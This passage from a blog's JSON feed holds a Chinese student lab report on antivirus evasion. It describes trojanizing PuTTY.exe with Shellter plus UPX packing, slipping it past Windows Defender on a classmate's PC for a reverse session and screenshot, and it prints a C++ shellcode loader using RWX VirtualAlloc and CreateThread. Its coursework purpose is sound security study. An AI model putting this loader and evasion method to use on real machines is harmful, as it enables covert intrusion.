src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/3621edfb11518f2f636ae3a2783dbb0.png\" data-is-external-image=\"true\"></span></p>\n<p class=\"md-end-block md-p\"> </p>\n<h3 class=\"md-end-block md-heading\"><span class=\"md-plain\">2.8 附加题：用另一电脑实测，在杀软开启的情况下，可运行并回连成功，注明电脑的杀软名称与版本</span></h3>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">使用</span><span class=\"md-meta-i-c  md-link\"><a href=\"https://www.shellterproject.com/introducing-shellter/\"><span class=\"md-plain\">Shellter | Shellter (shellterproject.com)</span></a></span><span class=\"md-plain\">向PUTTY.exe注入shellcode后再使用pux进行加壳</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">使用微信发送到打开了Windows Defender的</span><span class=\"md-pair-s \"><em><span class=\"md-plain\">20214321吴萌源</span></em></span><span class=\"md-plain\">的电脑上，没有被当成病毒杀掉，成功绕过了的防护</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">之前尝试被杀掉的：</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image\" data-src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/a0eaad7b665b40c15454131502b3cc7.png\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/a0eaad7b665b40c15454131502b3cc7.png\" alt=\"a0eaad7b665b40c15454131502b3cc7\" data-is-external-image=\"true\"></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">幸存下来的putty_upx.exe：</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image\" data-src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/3621edfb11518f2f636ae3a2783dbb0.png\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/3621edfb11518f2f636ae3a2783dbb0.png\" alt=\"3621edfb11518f2f636ae3a2783dbb0\" data-is-external-image=\"true\"></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">杀软版本：</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image\" data-src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/bb813546bcc212148e19e4b7a143ff5.png\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/bb813546bcc212148e19e4b7a143ff5.png\" alt=\"bb813546bcc212148e19e4b7a143ff5\" data-is-external-image=\"true\"></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">使用快速扫描：</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image\" data-src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/7c0c5ade859663b19cbfb4557e07768.png\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/7c0c5ade859663b19cbfb4557e07768.png\" alt=\"7c0c5ade859663b19cbfb4557e07768\" data-is-external-image=\"true\"></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">在运行之后putty_upx.exe之后攻击成功，但是在使用ls命令后后门程序马上就被删除了</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image\" data-src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/7571a791881b9534995b80c30d6b046.png\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/7571a791881b9534995b80c30d6b046.png\" alt=\"7571a791881b9534995b80c30d6b046\" data-is-external-image=\"true\"></span></p>\n<p class=\"md-end-block md-p\"> </p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">再次发送putty_upx.exe并重新尝试，在攻击之后文件依然没有被杀软删掉，但是不久之后就显示session died</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image\" data-src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/b0c406b36ee60d134b9dfcd21bbaec3.png\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/b0c406b36ee60d134b9dfcd21bbaec3.png\" alt=\"b0c406b36ee60d134b9dfcd21bbaec3\" data-is-external-image=\"true\"></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">使用screenshot屏幕截图：</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image\" data-src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240330194909289.png\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240330194909289.png\" alt=\"image-20240330194909289\" data-is-external-image=\"true\"></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image\" data-src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/4c345e413d7bb5efcb9b117ac3fb90c.png\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/4c345e413d7bb5efcb9b117ac3fb90c.png\" alt=\"4c345e413d7bb5efcb9b117ac3fb90c\" data-is-external-image=\"true\"></span></p>\n<p class=\"md-end-block md-p\"> </p>\n<h2 class=\"md-end-block md-heading\"><span class=\"md-plain\">3实验总结与体会</span></h2>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">通过本次实验，我学会了msf中编码器的使用，veil攻击平台的使用、upx加壳等基础的免杀操作，了解了VirusTotal、Virscan等免杀检测网站</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">在附加题中，我通过在网上找到的攻击平台Shellter组合加壳的操作实现了初步绕过windows defender的检测，并对在同一局域网下的其他电脑成功发动了攻击</span></p>\n<p class=\"md-end-block md-p\"> </p>\n<h2 class=\"md-end-block md-heading\"><span class=\"md-plain\">4遇到的问题与解决方法</span></h2>\n<h3 class=\"md-end-block md-heading\"><span class=\"md-plain\">4.1Veil安装</span></h3>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">在第一次安装veil时由于其安装过程较慢，我以为是卡住了，按Ctrl + C打断之后重新安装出错，反复使用apt remove后重新安装依然无法解决，每次都会卡在</span><span class=\"md-pair-s\" spellcheck=\"false\"><code>wine :failed to open L\"c:\\\\windows\\\\syswow64\\\\rundll32.exe\": c0000135</code></span></p>\n<p class=\"md-end-block md-p\"> </p>\n<p class=\"md-end-block md-p\"><span class=\"md-image\" data-src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240331110432.png\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240331110432.png\" alt=\"微信图片_20240331110432\" data-is-external-image=\"true\"></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">最后重装kali系统，并直接运行(执行之后就别动了,弹窗什么的它都会自动执行,只用在最后输入密码即可)后解决</span></p>\n<pre class=\"md-fences mock-cm md-end-block md-fences-with-lineno\" lang=\"shell\" spellcheck=\"false\">apt -y install veil<br>/usr/share/veil/config/setup.sh --force --silent</pre>\n<p class=\"md-end-block md-p\"> </p>\n<h3 class=\"md-end-block md-heading\"><span class=\"md-plain\">4.2C语言交叉编译</span></h3>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">使用</span></p>\n<pre class=\"md-fences mock-cm md-end-block md-fences-with-lineno\" lang=\"shell\" spellcheck=\"false\">i686-w64-mingw32-g++ shellcode_win_4325.c -o shellcode_win_4325.exe -static-libgcc</pre>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">编译exe后，在windows中运行exe文件后无法成功攻击</span></p>\n<p class=\"md-end-block md-p\"> </p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">使用</span></p>\n<pre class=\"md-fences mock-cm md-end-block md-fences-with-lineno\" lang=\"shell\" spellcheck=\"false\">gcc -m32 -no-pie -fno-pie shellcode_linux_4325.c -o shellcode_linux_4325</pre>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">编译后</span></p>\n<pre class=\"md-fences mock-cm md-end-block md-fences-with-lineno\" lang=\"shell\" spellcheck=\"false\">┌──(root㉿kali)-[/home/kali/Desktop]<br>└─# file shellcode_linux_4325                                               <br>shellcode_linux_4325: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=38f5903779f6999ff273683ffc071706f17db8f6, for GNU/Linux 3.2.0, not stripped</pre>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">关闭地址随机化，打开堆栈可执行后再次尝试，依然无法解决</span></p>\n<p class=\"md-end-block md-p\"> </p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">最后在参考</span><span class=\"md-pair-s \"><strong><span class=\"md-plain\">20214321吴萌源</span></strong></span><span class=\"md-plain\">同学的方法后成功攻击</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">问题是由于buf中的程序不可执行导致，将文件后添加从</span></p>\n<pre class=\"md-fences mock-cm md-end-block md-fences-with-lineno\" lang=\"c\" spellcheck=\"false\">int main()<br>{<br>        int (*func)() = (int(*)())buf;<br>        func();<br>}</pre>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">替换为即可解决</span></p>\n<pre class=\"md-fences mock-cm md-end-block md-fences-with-lineno\" lang=\"c\" spellcheck=\"false\">#include &lt;windows.h&gt;  <br>#include &lt;iostream&gt;  <br>int main() {  <br>    // 分配可执行内存  <br>    void* execMem = VirtualAlloc(0, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);  <br>    if (execMem == NULL) {  <br>        std::cerr &lt;&lt; \"Memory allocation failed!\" &lt;&lt; std::endl;  <br>        return 1;  <br>    }  <br>   // 复制shellcode到可执行内存  <br>    memcpy(execMem, buf, sizeof(buf));   <br>    HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execMem, NULL, 0, NULL);  <br>    if (thread == NULL) {  <br>        std::cerr &lt;&lt; \"Thread creation failed!\" &lt;&lt; std::endl;  <br>        VirtualFree(execMem, 0, MEM_RELEASE);  <br>        return 1;  <br>    }  <br>    WaitForSingleObject(thread, INFINITE);  <br>    CloseHandle(thread);  <br>    VirtualFree(execMem, 0, MEM_RELEASE);  <br>    return 0;  <br>}</pre>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\" data-src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240404140410028.png\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240404140410028.png\" alt=\"image-20240404140410028\" data-is-external-image=\"true\"></span></p>",
            "author": {
                "name": "Ethan Chase"
            },
            "tags": [
                   "网络对抗"
            ],
            "date_published": "2024-04-07T07:22:38+08:00",
            "date_modified": "2024-04-07T07:36:02+08:00"
        },
        {
            "id": "https://Ethan-Chase.github.io/first-post.html",
            "url": "https://Ethan-Chase.github.io/first-post.html",
            "title": "First Post",
            "content_html": "<h1 id=\"hello-word\">Hello word</h1>\n<p>‘’’\nprintf(“hello word”)\n‘’’</p>",
            "author": {
                "name": "Ethan Chase"
            },
            "tags": [
            ],
            "date_published": "2024-04-07T07:11:42+08:00",
            "date_modified": "2024-04-07T07:11:42+08:00"
        }
    ]
}
